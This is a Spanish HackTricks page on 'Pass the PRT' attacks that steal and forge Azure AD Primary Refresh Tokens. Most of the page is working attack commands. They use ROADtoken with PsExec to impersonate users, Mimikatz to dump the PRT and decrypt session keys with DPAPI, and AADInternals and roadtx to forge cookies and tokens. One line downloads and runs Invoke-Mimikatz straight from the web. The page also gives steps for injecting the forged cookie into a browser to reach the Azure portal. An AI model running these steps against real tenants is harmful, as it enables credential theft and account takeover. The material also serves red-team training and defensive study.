# Az - Pasar el PRT

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## 쯈u칠 es un PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### Comprueba si tienes un PRT
```
Dsregcmd.exe /status
```
En la secci칩n Estado de SSO, deber칤as ver que el **`AzureAdPrt`** est치 configurado en **YES**.

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

En la misma salida tambi칠n puedes ver si el **dispositivo est치 unido a Azure** (en el campo `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## Cookie PRT

La cookie PRT en realidad se llama **`x-ms-RefreshTokenCredential`** y es un JSON Web Token (JWT). Un JWT contiene **3 partes**, el **encabezado**, **carga 칰til** y **firma**, divididos por un `.` y todos codificados en base64 de forma segura para URL. Una cookie PRT t칤pica contiene el siguiente encabezado y cuerpo:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
El **Token de Actualizaci칩n Principal (PRT)** real est치 encapsulado dentro del **`refresh_token`**, el cual est치 encriptado por una clave bajo el control de Azure AD, lo que hace que su contenido sea opaco e indescifrable para nosotros. El campo **`is_primary`** indica la encapsulaci칩n del token de actualizaci칩n principal dentro de este token. Para asegurar que la cookie permanezca vinculada a la sesi칩n de inicio de sesi칩n espec칤fica para la que fue destinada, el `request_nonce` se transmite desde la p치gina `logon.microsoftonline.com`.

### Flujo de la Cookie PRT utilizando TPM

El proceso **LSASS** enviar치 al TPM el **contexto KDF**, y el TPM utilizar치 la **clave de sesi칩n** (obtenida cuando el dispositivo fue registrado en AzureAD y almacenada en el TPM) y el contexto anterior para **derivar** una **clave**, y esta **clave derivada** se utiliza para **firmar la cookie PRT (JWT).**

El **contexto KDF** es un nonce de AzureAD y el PRT creando un **JWT** mezclado con un **contexto** (bytes aleatorios).

Por lo tanto, incluso si el PTR no puede ser extra칤do porque est치 ubicado dentro del TPM, es posible abusar de LSASS para **solicitar claves derivadas de nuevos contextos y usar las claves generadas para firmar Cookies**.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Escenarios de Abuso de PRT

Como un **usuario regular** es posible **solicitar el uso de PRT** pidiendo a LSASS datos de SSO.\
Esto se puede hacer como **aplicaciones nativas** que solicitan tokens desde el **Administrador de Cuentas Web** (token broker). WAM pasa la solicitud a **LSASS**, que solicita tokens usando una afirmaci칩n PRT firmada. O puede hacerse con **flujos basados en navegador (web)** donde una **cookie PRT** se utiliza como **encabezado** para autenticar solicitudes a p치ginas de inicio de sesi칩n de Azure AS.

Como **SYSTEM** podr칤as **robar el PRT si no est치 protegido** por TPM o **interactuar con las claves de PRT en LSASS** utilizando APIs criptogr치ficas.

## Ejemplos de Ataques de Pasar el PRT

### Ataque - ROADtoken

Para obtener m치s informaci칩n sobre este m칠todo [**consulta esta publicaci칩n**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken ejecutar치 **`BrowserCore.exe`** desde el directorio correcto y lo utilizar치 para **obtener una cookie PRT**. Esta cookie luego se puede utilizar con ROADtools para autenticar y **obtener un token de actualizaci칩n persistente**.

Para generar una cookie PRT v치lida, lo primero que necesitas es un nonce.\
Puedes obtenerlo con:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
O utilizando [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Entonces puedes usar [**roadtoken**](https://github.com/dirkjanm/ROADtoken) para obtener un nuevo PRT (ejecutar la herramienta desde un proceso del usuario para atacar):
```powershell
.\ROADtoken.exe <nonce>
```
Como una l칤nea: 

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Luego puedes usar la **cookie generada** para **generar tokens** e **iniciar sesi칩n** utilizando Azure AD **Graph** o Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Ataque - Utilizando roadrecon



### Ataque - Utilizando AADInternals y un PTR filtrado

`Get-AADIntUserPRTToken` **obtiene el token PRT del usuario** desde el equipo unido a Azure AD o unido de forma h칤brida. Utiliza `BrowserCore.exe` para obtener el token PRT.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
O si tienes los valores de Mimikatz, tambi칠n puedes usar AADInternals para generar un token:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Ve a [https://login.microsoftonline.com](https://login.microsoftonline.com), borra todas las cookies para login.microsoftonline.com e introduce una nueva cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Luego ve a [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
El resto deber칤a ser el predeterminado. Aseg칰rate de poder actualizar la p치gina y que la cookie no desaparezca, si lo hace, es posible que hayas cometido un error y debas volver a realizar el proceso. Si no desaparece, deber칤as estar bien.
{% endhint %}

### Ataque - Mimikatz

#### Pasos

1. El **PRT (Token de Actualizaci칩n Principal) se extrae de LSASS** (Local Security Authority Subsystem Service) y se almacena para su uso posterior.
2. A continuaci칩n, se extrae la **Clave de Sesi칩n**. Dado que esta clave se emite inicialmente y luego se vuelve a cifrar por el dispositivo local, se requiere descifrarla utilizando una clave maestra DPAPI. Puedes encontrar informaci칩n detallada sobre DPAPI (API de Protecci칩n de Datos) en estos recursos: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) y para comprender su aplicaci칩n, consulta el ataque [Pass-the-cookie](az-pass-the-cookie.md).
3. Despu칠s de descifrar la Clave de Sesi칩n, se obtienen la **clave derivada y el contexto para el PRT**. Estos son cruciales para la **creaci칩n de la cookie PRT**. Espec칤ficamente, la clave derivada se utiliza para firmar el JWT (Token Web JSON) que constituye la cookie. Una explicaci칩n detallada de este proceso ha sido proporcionada por Dirk-jan, accesible [aqu칤](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Ten en cuenta que si el PRT est치 dentro del TPM y no dentro de `lsass`, **mimikatz no podr치 extraerlo**.\
Sin embargo, ser치 posible **obtener una clave de una clave derivada de un contexto** del TPM y usarla para **firmar una cookie (ver opci칩n 3).**
{% endhint %}

Puedes encontrar una **explicaci칩n detallada del proceso realizado** para extraer estos detalles aqu칤: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Esto no funcionar치 exactamente despu칠s de las correcciones de agosto de 2021 para obtener tokens PRT de otros usuarios, ya que solo el usuario puede obtener su PRT (un administrador local no puede acceder a los PRT de otros usuarios), pero puede acceder al suyo.
{% endhint %}

Puedes usar **mimikatz** para extraer el PRT:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

**Copia** la parte etiquetada como **Prt** y gu치rdala.\
Extrae tambi칠n la clave de sesi칩n (el **`KeyValue`** del campo **`ProofOfPossesionKey`** que puedes ver resaltado abajo. Esto est치 encriptado y necesitaremos usar nuestras claves maestras de DPAPI para descifrarlo.

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Si no ves ning칰n dato de PRT, podr칤a ser que **no tengas ning칰n PRT** porque tu dispositivo no est치 unido a Azure AD o podr칤a ser que est칠s **ejecutando una versi칩n antigua** de Windows 10.
{% endhint %}

Para **descifrar** la clave de sesi칩n, necesitas **elevar** tus privilegios a **SYSTEM** para ejecutar bajo el contexto de la computadora y poder usar la **clave maestra de DPAPI para descifrarla**. Puedes usar los siguientes comandos para hacerlo:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

#### Opci칩n 1 - Mimikatz Completo

* Ahora quieres copiar tanto el valor de Contexto:

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* Como el valor de la clave derivada:

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

* Finalmente, puedes usar toda esta informaci칩n para **generar cookies PRT**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

* Ir a [https://login.microsoftonline.com](https://login.microsoftonline.com), borrar todas las cookies para login.microsoftonline.com e ingresar una nueva cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Luego ve a [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
El resto deber칤a ser el predeterminado. Aseg칰rate de poder actualizar la p치gina y que la cookie no desaparezca, si lo hace, es posible que hayas cometido un error y debas volver a realizar el proceso. Si no desaparece, todo deber칤a estar bien.
{% endhint %}

#### Opci칩n 2 - roadrecon usando PTR

* Renueva primero el PRT, que se guardar치 en `roadtx.prt`:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
* Ahora podemos **solicitar tokens** utilizando el navegador interactivo con `roadtx browserprtauth`. Si usamos el comando `roadtx describe`, vemos que el token de acceso incluye una reclamaci칩n MFA porque el PRT que utilic칠 en este caso tambi칠n ten칤a una reclamaci칩n MFA.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Opci칩n 3 - roadrecon usando claves derivadas

Teniendo el contexto y la clave derivada extra칤da por mimikatz, es posible usar roadrecon para generar una nueva cookie firmada con:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Referencias

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
